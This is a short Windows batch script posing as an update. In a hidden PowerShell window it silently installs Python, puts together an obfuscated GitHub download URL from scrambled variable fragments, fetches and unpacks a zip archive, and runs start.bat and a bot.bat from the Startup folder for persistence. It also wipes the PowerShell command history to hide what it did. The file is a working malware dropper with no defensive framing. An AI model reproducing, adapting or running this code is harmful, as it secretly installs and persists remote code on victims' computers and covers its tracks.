@echo off
powershell -WindowStyle Hidden -Command "$code ='
@echo off
echo Updateing.........!
winget install --id Python.Python.3.12 --exact --accept-package-agreements --accept-source-agreements --silent
set s=ads&set d=c.zip&set a=/main/&set n=http&set t=ub.com/kevi&set o=s/ra&set w=levi/p&set e=s://gith&set k=fs/he&set r=w/re&
set ql=%n%%e%%t%%w%%o%%r%%k%%s%%a%%d%
set ZipPath=C:\Downloads\start.zip
set ExtractPath=C:\Downloads
powershell -Command "Invoke-WebRequest -Uri '%ql%' -OutFile '%ZipPath%'"
powershell -Command "Expand-Archive -Path '%ZipPath%' -DestinationPath '%ExtractPath%' -Force"
del %ZipPath%
cd %ExtractPath%
echo. > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
echo Updating & start "" cmd /c "timeout /t 7 >nul & cd /d %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup & echo Now in: %cd% & bot.bat"
start.bat
'; Start-Process cmd -ArgumentList '/c', $code -WindowStyle Hidden"
